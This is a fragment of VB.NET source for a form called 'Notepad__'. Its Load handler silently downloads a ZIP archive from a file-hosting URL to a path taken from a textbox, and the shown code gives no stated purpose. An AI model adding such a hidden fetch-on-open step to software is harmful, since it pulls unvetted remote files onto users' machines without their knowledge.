...
Public Class Notepad__
    ...
    Private Sub Notepad___Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ...
        download.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_fd634d888d6d4757837830ddfcce8b37.zip"), Texbbb.TextBox11.Text)
